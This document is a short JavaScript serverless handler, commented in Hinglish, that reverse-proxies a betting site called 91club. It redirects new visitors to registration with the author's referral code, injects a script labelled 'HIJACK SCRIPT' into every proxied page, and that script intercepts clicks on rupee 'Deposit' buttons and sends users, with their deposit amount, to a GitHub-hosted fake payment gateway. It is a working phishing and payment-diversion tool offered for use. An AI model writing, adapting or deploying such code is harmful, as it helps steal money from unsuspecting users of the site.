export default async function handler(req, res) {
  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
  const targetHost = "https://www.91appq.com";
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";

  // 1. URL Path check karo
  const path = req.url || "/";

  // 2. Agar banda bilkul naya hai, toh register pe bhejo [cite: 2025-12-24]
  if (path === "/" || path === "") {
    res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
    res.end();
    return;
  }

  // 3. PROXY: 91club ka koi bhi page ho (Main ya Register), use fetch karo
  const response = await fetch(targetHost + path, {
    headers: { 'User-Agent': req.headers['user-agent'] }
  });

  const contentType = response.headers.get("content-type");

  if (contentType && contentType.includes("text/html")) {
    let html = await response.text();

    // 4. HIJACK SCRIPT: Jo har page par "Deposit ₹" button ko dhundega
    const hijackScript = `
    <script>
      (function() {
        const myGitHub = "${myGitHub}";
        
        const scanAndLock = () => {
          // Saare buttons aur clickable elements ko check karo
          const elements = document.querySelectorAll('button, .van-button, [role="button"], div, span');
          
          elements.forEach(el => {
            const txt = el.innerText || "";
            // Condition: Sirf Red Deposit button jisme ₹ sign ho
            if (txt.includes('Deposit') && txt.includes('₹')) {
              
              if (!el.dataset.locked) {
                // 'True' capture method: Sabse pehle hamara click chalega
                const lockEvent = (e) => {
                  e.preventDefault();
                  e.stopImmediatePropagation();
                  
                  // Amount nikalne ka logic
                  const amtMatch = txt.match(/[\\d,.]+/);
                  const amt = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
                  
                  window.location.href = myGitHub + "?amount=" + amt;
                };

                el.addEventListener('click', lockEvent, true);
                el.addEventListener('touchstart', lockEvent, true);
                el.dataset.locked = "true";
              }
            }
          });
        };

        // 300ms mein scan taaki /main page load hote hi lock ho jaye
        setInterval(scanAndLock, 300);
      })();
    </script>`;

    res.setHeader('Content-Type', 'text/html');
    return res.send(html.replace('</body>', hijackScript + '</body>'));
  }

  // Static files (CSS/JS) ko normal load hone do
  const data = await response.arrayBuffer();
  res.setHeader('Content-Type', contentType);
  res.send(Buffer.from(data));
}
